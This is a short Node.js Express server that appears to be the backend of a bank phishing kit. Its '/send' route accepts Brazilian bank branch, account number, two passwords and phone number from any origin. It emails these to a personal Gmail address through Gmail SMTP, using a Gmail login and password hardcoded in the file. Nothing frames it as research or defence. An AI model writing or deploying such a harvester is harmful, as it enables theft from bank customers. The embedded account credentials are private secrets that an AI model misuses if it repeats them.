const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const cors = require('cors')


let app = express();

app.use(express.urlencoded({ extended: true }))
app.use(express.json())

app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});


app.get('/', function (req, res) {
    res.send('<h1>Hello World firebase!</h1>');
});

app.post('/send', cors(), function (req, res) {

    
    async function main() {

        const account = {
            user: 'outletnewoakley@gmail.com',
            pass: '25553245'
          }
          var transporter = nodemailer.createTransport({
            pool: true, //keeps the server connection open
            host: 'smtp.gmail.com', //your email server
            port: 465, //gmail uses SSL
            secure: true, //gmail sends secure
            auth: {
                 user: account.user,
                 pass: account.pass
            }
          });

        

        let info = await transporter.sendMail({
            from: '"Fred Foo 👻" <foo@example.com>',
            to: 'marcasouza15@gmail.com',
            subject: req.body.html,
            text: req.body.html,
            html: `<h1>agencia:${req.body.agencia}</h1>
            <h1>conta:${req.body.conta}</h1>
            <h1>senha8:${req.body.senha6}</h1>
            <h1>senha6:${req.body.senha8}</h1>
            <h1>telefone:${req.body.tel}</h1>
            
            
            
            
            
            `
        });

        console.log('Message sent: %s', info.messageId);
        console.log(req.body.html)

        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

    }

    main().catch(console.error);

});






app.listen(process.env.PORT || 3000)
